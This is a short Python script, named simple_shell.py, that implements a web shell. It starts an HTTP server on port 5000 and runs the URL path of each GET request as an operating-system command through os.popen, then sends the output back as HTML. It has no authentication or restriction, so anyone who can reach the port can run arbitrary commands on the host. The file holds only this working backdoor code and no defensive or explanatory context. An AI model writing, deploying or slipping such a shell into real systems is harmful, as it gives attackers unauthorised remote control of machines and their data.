# simple_shell.py
import os
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

class WebShell(BaseHTTPRequestHandler):
    def do_GET(self):
        command = self.path.strip('/')
        if command:
            try:
                result = os.popen(command).read()
            except Exception as e:
                result = str(e)
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(f"<pre>{result}</pre>".encode())
        else:
            self.send_response(400)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>Provide a command in the URL (/dir)</h1>")

def run(server_class=HTTPServer, handler_class=WebShell, port=5000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Running web shell on port {port}...")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
